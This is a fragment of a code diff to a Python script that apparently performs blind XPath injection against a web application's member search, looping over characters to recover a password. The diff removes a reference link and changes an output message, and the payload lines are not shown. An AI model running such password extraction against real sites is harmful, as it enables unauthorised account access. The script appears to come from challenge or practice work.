@@ -1,4 +1,4 @@
-#https://wiki.zenk-security.com/doku.php?id=failles_web:xpath_injection
+
 import requests
 
 page = "http:///?action=members&search="
@@ -27,5 +27,5 @@ for t in range(0,50):
                 print(passwd)
                 break
     else:
-        print("Le mot de passe est : "+passwd)
+        print("Pass : "+passwd)
         break
